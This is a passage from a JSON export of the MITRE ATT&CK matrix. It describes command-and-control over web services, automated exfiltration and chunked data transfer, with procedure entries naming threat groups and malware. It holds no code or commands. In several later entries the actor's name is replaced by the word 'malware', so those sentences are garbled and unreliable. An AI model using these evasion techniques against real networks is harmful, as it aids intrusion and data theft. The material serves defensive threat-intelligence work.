                "description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.[1]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.[2]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> collects C2 information via a dead drop resolver.[3][4][5]"
                    },
                    "S0069": {
                        "ID": "S0069",
                        "Name": "BLACKCOFFEE",
                        "Description": "<name> uses Microsoft\u2019s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.[6][7]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name>'s MSGET downloader uses a dead drop resolver to access malicious payloads.[8]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign.[9]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can retrieve C2 domain information from actor-controlled S3 buckets.[10]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can obtain C2 information from Google Docs.[2]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> can read C2 information from Google Documents and YouTube.[2]"
                    },
                    "S1051": {
                        "ID": "S1051",
                        "Name": "KEYPLUG",
                        "Description": "The <name> Windows variant has retrieved C2 addresses from encoded data in posts on tech community forums.[9]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has used YouTube to store and hide C&C server domains.[11]"
                    },
                    "S0051": {
                        "ID": "S0051",
                        "Name": "MiniDuke",
                        "Description": "Some <name> components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.[12][13][14]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.[15]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> uses Pastebin to store C2 addresses.[16]"
                    },
                    "S0518": {
                        "ID": "S0518",
                        "Name": "PolyglotDuke",
                        "Description": "<name> can use Twitter, Reddit, Imgur and other websites to get a C2 URL.[14]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.[17]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> has used an RSS feed on Livejournal to update a list of encrypted C2 server names. <name> has also hidden Pony C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.[18][19][20]"
                    },
                    "G0048": {
                        "ID": "G0048",
                        "Name": "RTM",
                        "Description": "<name> has used an RSS feed on Livejournal to update a list of encrypted C2 server names.[18]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can obtain a webpage hosted on Pastebin to update its C2 domain list.[21]"
                    }
                }
            },
            "002": {
                "name": "Bidirectional Communication",
                "href": "/techniques/T1102/002",
                "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "Procedure": {
                    "G0005": {
                        "ID": "G0005",
                        "Name": "APT12",
                        "Description": "<name> has used blogs and WordPress for C2 infrastructure.[1]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used Google Drive for C2.[2]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.[3][4]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has communicated with C2 through files uploaded to and downloaded from DropBox.[5]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> can use multiple C2 channels, including RSS feeds, Github, forums, and blogs.[6][7][8]"
                    },
                    "S0069": {
                        "ID": "S0069",
                        "Name": "BLACKCOFFEE",
                        "Description": "<name> has also obfuscated its C2 traffic as normal traffic to sites such as Github.[9][10]"
                    },
                    "S0657": {
                        "ID": "S0657",
                        "Name": "BLUELIGHT",
                        "Description": "<name> can use different cloud providers for its C2.[11]"
                    },
                    "S0651": {
                        "ID": "S0651",
                        "Name": "BoxCaon",
                        "Description": "<name> has used DropBox for C2 communications.[12]"
                    },
                    "S0025": {
                        "ID": "S0025",
                        "Name": "CALENDAR",
                        "Description": "The <name> malware communicates through the use of events in Google Calendar.[13][14]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> has used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.[15]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can use Dropbox to download malicious payloads, send commands, and receive information.[16][17]"
                    },
                    "S0054": {
                        "ID": "S0054",
                        "Name": "CloudDuke",
                        "Description": "One variant of <name> uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.[18]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.[19]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has the ability to use the Gmail web UI to receive commands and exfiltrate information.[20][21]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "<name> uses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.[22]"
                    },
                    "S1023": {
                        "ID": "S1023",
                        "Name": "CreepyDrive",
                        "Description": "<name> can use OneDrive for C2.[23]"
                    },
                    "S0538": {
                        "ID": "S0538",
                        "Name": "Crutch",
                        "Description": "<name> can use Dropbox to receive commands and upload stolen data.[24]"
                    },
                    "S0213": {
                        "ID": "S0213",
                        "Name": "DOGCALL",
                        "Description": "<name> is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.[3][25]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use Dropbox and GitHub for C2.[26]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.[27]"
                    },
                    "S0026": {
                        "ID": "S0026",
                        "Name": "GLOOXMAIL",
                        "Description": "<name> communicates to servers operated by Google using the Jabber/XMPP protocol.[13][28]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can utilize web services including Google sites to send and receive C2 data.[29][30]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used cloud services, including OneDrive, for C2.[23]"
                    },
                    "S0215": {
                        "ID": "S0215",
                        "Name": "KARAE",
                        "Description": "<name> can use public cloud-based storage providers for command and control.[3]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> has used compromised WordPress blogs as C2 servers.[31]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used Blogspot pages for C2.[32]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories.[33]"
                    },
                    "S0042": {
                        "ID": "S0042",
                        "Name": "LOWBALL",
                        "Description": "<name> uses the Dropbox cloud storage service for command and control.[34]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> malware can use a SOAP Web service to communicate with its C2 server.[35]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used web services including OneHub to distribute remote access tools.[36]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "For <name>, APT29 used social media platforms to hide communications to C2 servers.[37]"
                    },
                    "S0229": {
                        "ID": "S0229",
                        "Name": "Orz",
                        "Description": "<name> has used Technet and Pastebin web pages for command and control.[38]"
                    },
                    "G1005": {
                        "ID": "G1005",
                        "Name": "POLONIUM",
                        "Description": "<name> has used OneDrive and DropBox for C2.[23]"
                    },
                    "S0216": {
                        "ID": "S0216",
                        "Name": "POORAIM",
                        "Description": "<name> has used AOL Instant Messenger for C2.[3]"
                    },
                    "S0393": {
                        "ID": "S0393",
                        "Name": "PowerStallion",
                        "Description": "<name> uses Microsoft OneDrive as a C2 server via a network drive mapped with net use.[39]"
                    },
                    "S0511": {
                        "ID": "S0511",
                        "Name": "RegDuke",
                        "Description": "<name> can use Dropbox as its C2 server.[37]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> used blogpost.com as its primary command and control server during a campaign.[40]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> has used Google Drive as a Command and Control channel. [41]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> has used legitimate social networking sites and cloud platforms (including but not limited to Twitter, Yandex, Dropbox, and Mediafire) for C2 communications.[42][43][44]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. <name> also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.[45][46]"
                    },
                    "S0218": {
                        "ID": "S0218",
                        "Name": "SLOWDRIFT",
                        "Description": "<name> uses cloud based services for C2.[3]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> has the ability to use the Telegram Bot API from Telegram Messenger to send and receive messages.[47]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "A <name> JavaScript backdoor has used Google Apps Script as its C2 server.[48][49]"
                    },
                    "S0333": {
                        "ID": "S0333",
                        "Name": "UBoatRAT",
                        "Description": "<name> has used GitHub and a public blog service in Hong Kong for C2 communications.[50]"
                    },
                    "S0248": {
                        "ID": "S0248",
                        "Name": "yty",
                        "Description": "<name> communicates to the C2 server by retrieving a Google Doc.[51]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.[52][53]"
                    }
                }
            },
            "003": {
                "name": "One-Way Communication",
                "href": "/techniques/T1102/003",
                "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "Procedure": {
                    "S0568": {
                        "ID": "S0568",
                        "Name": "EVILNUM",
                        "Description": "<name> has used a one-way communication method via GitLab and Digital Point to perform C2.[1]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "The \"tDiscoverer\" variant of <name> establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. <name> binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.[2]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.[3]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has downloaded a zip file for execution on the system.[4][5][6]"
                    },
                    "S0052": {
                        "ID": "S0052",
                        "Name": "OnionDuke",
                        "Description": "<name> uses Twitter as a backup C2.[7]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
        "Procedure": {
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.[1]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can be utilized to abuse sslip.io, a free IP to domain mapping service, as part of actor-controlled C2 channels.[2]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware downloads have been hosted on Google Docs.[3][4]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can download files from Dropbox using a hardcoded access token.[5]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams.[6]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware has been downloaded to victim's machines from OneDrive.[7]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used the Cloudflare services for C2 communications.[8]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider downloaded tools from sites including file.io, GitHub, and paste.ee.[9]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware can use Pastebin to receive C2 commands.[10]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can download additional modules from actor-controlled Amazon S3 buckets.[11]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can retrieve its primary payload from public sites such as Pastebin and Textbin.[12]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware has used the dogechain.info API to generate a C2 address.[13]"
            },
            "S0547": {
                "ID": "S0547",
                "Name": "DropBook",
                "Description": "malware can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions.[14][15]"
            },
            "G1003": {
                "ID": "G1003",
                "Name": "Ember Bear",
                "Description": "malware has used Discord's content delivery network (CDN) to deliver malware and malicious scripts to a compromised host.[16]"
            },
            "G1011": {
                "ID": "G1011",
                "Name": "EXOTIC LILY",
                "Description": "malware has used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.[17]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used Pastebin and Google Storage to host content for their operations.[18]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has used sslip.io, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.[19]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used Amazon Web Services to host C2.[20]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.[21]"
            },
            "S0561": {
                "ID": "S0561",
                "Name": "GuLoader",
                "Description": "malware has the ability to download malware from Google Drive.[22]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has downloaded scripts from GitHub.[23]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware has incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.[24][25]"
            },
            "G0140": {
                "ID": "G0140",
                "Name": "LazyScripter",
                "Description": "malware has used GitHub to host its payloads to operate spam campaigns.[26]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has used DropBox URLs to deliver variants of PlugX.[27]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware has used web services including Paste.ee to host payloads.[28]"
            },
            "S0508": {
                "ID": "S0508",
                "Name": "ngrok",
                "Description": "malware has been used by threat actors to proxy C2 connections to malware service subdomains.[29]"
            },
            "C0005": {
                "ID": "C0005",
                "Name": "Operation Spalax",
                "Description": "During malware, the threat actors used OneDrive and MediaFire to host payloads.[30]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has used Pastebin, Gitee, and GitLab for Command and Control.[31][32]"
            },
            "S0546": {
                "ID": "S0546",
                "Name": "SharpStage",
                "Description": "malware has used a legitimate web service for evading detection.[14]"
            },
            "S0589": {
                "ID": "S0589",
                "Name": "Sibot",
                "Description": "malware has used a legitimate compromised website to download DLLs to the victim's machine.[33]"
            },
            "S0649": {
                "ID": "S0649",
                "Name": "SMOKEDHAM",
                "Description": "malware has used Google Drive and Dropbox to host files downloaded by victims via malicious links.[34]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware can download additional payloads from web services including Pastebin and top4top.[35]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware has used Amazon Web Services to host second-stage servers.[36]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has leveraged iplogger.org to send collected data back to C2.[37][38]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.[10][39]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware can download additional payloads hosted on a Discord channel.[40][41][42][43][44]"
            }
        }
    },
    "T1020": {
        "ttp_name": "Automated Exfiltration",
        "ttp_id": "T1020",
        "href": "/techniques/T1020",
        "subtechnique": {
            "001": {
                "name": "Traffic Duplication",
                "href": "/techniques/T1020/001",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. [1][2]Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.[3][4]Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[5][6][7]Adversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.",
                "Procedure": {}
            }
        },
        "tactic": "Exfiltration",
        "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.[1] When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
        "Procedure": {
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.[2]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware exfiltrates collected files automatically over FTP to remote servers.[3]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware has automatically exfiltrated stolen files to Dropbox.[4]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.[5]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware can automatically exfiltrate gathered SSH credentials.[6]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware has the ability to automatically send collected data back to the threat actors' C2.[7]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors collected information via Empire, which was automatically sent back to the adversary's C2.[7]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used modules that automatically upload gathered documents to the C2 server.[1]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has performed  frequent and scheduled data exfiltration from compromised networks.[8]"
            },
            "S0395": {
                "ID": "S0395",
                "Name": "LightNeuron",
                "Description": "malware can be configured to automatically exfiltrate files under a specified directory.[9]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware\u2019s collected files are exfiltrated automatically to remote servers.[10]"
            },
            "S1017": {
                "ID": "S1017",
                "Name": "OutSteel",
                "Description": "malware can automatically upload collected files to its C2 server.[11]"
            },
            "S0643": {
                "ID": "S0643",
                "Name": "Peppy",
                "Description": "malware has the ability to automatically exfiltrate files and keylogs.[12]"
            },
            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes. malware also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.[13]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware sent collected system and network information compiled into a report to an adversary-controlled C2.[14]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has configured tools to automatically send collected files to attacker controlled servers.[15]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can automatically exfiltrate collected documents to the C2 server.[16][17]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to manage an automated queue of egress files and commands sent to its C2.[18]"
            },
            "S0131": {
                "ID": "S0131",
                "Name": "TINYTYPHON",
                "Description": "When a document is found matching one of the extensions in the configuration, malware uploads it to the C2 server.[19]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has used a copy function to automatically exfiltrate sensitive data from air-gapped systems using USB storage.[20]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "malware automatically exfiltrates collected files via removable media when an infected device connects to an air-gapped victim machine after initially being connected to an internet-enabled victim machine. [21]"
            }
        }
    },
    "T1030": {
        "ttp_name": "Data Transfer Size Limits",
        "ttp_id": "T1030",
        "href": "/techniques/T1030",
        "tactic": "Exfiltration",
        "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
        "Procedure": {
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has divided files if the size is 0x1000000 bytes or more.[1]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has split archived exfiltration files into chunks smaller than 1MB.[2]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.[3]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors limited Rclone's bandwidth setting during exfiltration.[4]"
            },
            "C0026": {
                "ID": "C0026",
                "Name": "C0026",
                "Description": "During malware, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.[5]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware exfiltrates data in compressed chunks if a message is larger than 4096 bytes .[6]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware will break large data sets into smaller chunks for exfiltration.[7]"
            },
            "S0170": {
                "ID": "S0170",
                "Name": "Helminth",
                "Description": "malware splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.[8]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.[9]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can exfiltrate data to the C2 server in 27-character chunks.[10]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has split archived files into multiple parts to bypass a 5MB limit.[11]"
            },
            "S0699": {
                "ID": "S0699",
                "Name": "Mythic",
                "Description": "malware supports custom chunk sizes used to upload/download files.[12]"
            },
            "S0644": {
                "ID": "S0644",
                "Name": "ObliqueRAT",
                "Description": "malware can break large files of interest into smaller chunks to prepare them for exfiltration.[13]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware exfiltrates command output and collected files to its C2 server in 1500-byte blocks.[14]"
            },
            "S0150": {
                "ID": "S0150",
                "Name": "POSHSPY",
                "Description": "malware uploads data in 2048-byte chunks.[15]"
            },
            "S1040": {
                "ID": "S1040",
                "Name": "Rclone",
                "Description": "The malware \"chunker\" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.[16][4]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. malware can also download data from the C2 which is split into 81,920-byte portions.[17]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware actors have split RAR files for exfiltration into parts.[18]"
            }
        }
    },
    "T1048": {
        "ttp_name": "Exfiltration Over Alternative Protocol",
        "ttp_id": "T1048",
        "href": "/techniques/T1048",
        "subtechnique": {
            "001": {
                "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
                "href": "/techniques/T1048/001",
                "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
                "Procedure": {}
            },
            "002": {
                "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
                "href": "/techniques/T1048/002",
                "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.[1]"
                    },
                    "S1040": {
                        "ID": "S1040",
                        "Name": "Rclone",
                        "Description": "<name> can exfiltrate data over SFTP or HTTPS via WebDAV.[2]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.[3]"
                    }
                }
            },
            "003": {
                "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
                "href": "/techniques/T1048/003",
                "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.[1]Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
                "Procedure": {
                    "S0331": {
